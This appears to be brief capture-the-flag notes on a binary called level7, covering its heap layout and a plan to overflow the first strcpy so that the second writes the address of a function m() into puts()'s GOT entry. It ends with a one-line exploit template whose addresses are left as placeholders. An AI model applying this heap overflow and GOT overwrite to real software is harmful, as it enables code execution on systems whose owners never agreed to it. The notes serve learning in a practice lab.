decompile ./level7

2 malloc which will then both have 2 malloc within each

the struct is roughly : (char *)ptr1 = malloc(8);
                        *(char **)&ptr[4] = malloc(8);
                        (char *)ptr2 = malloc(8);
                        *(char **)&ptr2[4] = malloc(8);

the last 2 malloc will get av[1] and av[2]
so dest1 = ptr1[4]; dest2 = ptr2[4];
strcpy(dest1, av[1]); strcpy(dest2. av[2])


the goal is here is to change the adress of the dest of the 2nd strcpy to the GOT of puts()
and then the replace it by the adress of m()

we need to find the difference between the adress of the 4th malloc and the 2nd
this will be our padding for the first av[1] 
and then we add the adress of the GOT of puts to av[1]

av[2] is just the adress of m()
./level7 $(python -c 'print "A" * 20 + ""adress of GOT puts()') $(python -c 'print "adress of m()"')
